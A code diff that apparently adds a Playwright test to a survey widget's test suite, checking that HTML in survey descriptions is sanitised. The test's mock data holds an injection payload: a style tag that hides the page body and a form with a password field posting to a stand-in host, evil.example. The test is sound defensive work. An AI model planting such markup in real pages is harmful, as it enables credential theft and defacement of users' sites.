@@ -1,5 +1,5 @@
 import { pollUntilEventCaptured } from '../utils/event-capture-utils'
-import { expect, test } from '../utils/posthog-playwright-test-base'
+import { expect, test, type WindowWithPostHog } from '../utils/posthog-playwright-test-base'
 import { start } from '../utils/setup'
 
 const startOptions = {
@@ -343,6 +343,55 @@ test.describe('surveys - customization', () => {
         await expect(page).toHaveURL(originalUrl)
         await expect(page.locator('.PostHogSurvey-123 .survey-form')).toBeVisible()
         await popup.close()
+    })
+
+    test('inline description HTML cannot style the host page or inject form controls', async ({ page, context }) => {
+        await page.route('**/surveys/**', (route) =>
+            route.fulfill({
+                json: {
+                    surveys: [
+                        {
+                            id: '123',
+                            name: 'Test survey',
+                            type: 'popover',
+                            start_date: '2021-01-01T00:00:00Z',
+                            questions: [
+                                {
+                                    ...openTextQuestion,
+                                    description:
+                                        '<p>Rate us</p><style>body{display:none !important}</style>' +
+                                        '<form action="https://evil.example/c"><input type="password">' +
+                                        '<button>Send</button><textarea>Secret</textarea>' +
+                                        '<select><option>Choice</option></select></form>' +
+                                        '<span style="color: red">Styled text</span>',
+                                    descriptionContentType: 'html',
+                                },
+                            ],
+                        },
+                    ],
+                },
+            })
+        )
+        await start({ ...startOptions, options: { disable_surveys_automatic_display: true } }, page, context)
+        await page.evaluate(
+            () =>
+                new Promise<void>((resolve) => {
+                    const posthog = (window as WindowWithPostHog).posthog!
+                    posthog.onSurveysLoaded(() => {
+                        posthog.renderSurvey('123', '#survey')
+                        resolve()
+                    })
+                })
+        )
+
+        await expect(page.locator('body')).not.toHaveCSS('display', 'none')
+        const description = page.locator('#survey .survey-question-description')
+        await expect(description).toBeVisible()
+        await expect(description.locator('style, form, input, button, textarea, select')).toHaveCount(0)
+        await expect(description.locator('p')).toHaveText('Rate us')
+        await expect(description.locator('span')).toHaveCSS('color', 'rgb(255, 0, 0)')
+        await expect(page.locator('#survey .survey-form textarea')).toBeVisible()
+        await expect(page.locator('#survey .form-submit')).toBeVisible()
     })
 
     test('properly wraps long html content in question description', async ({ page, context }) => {
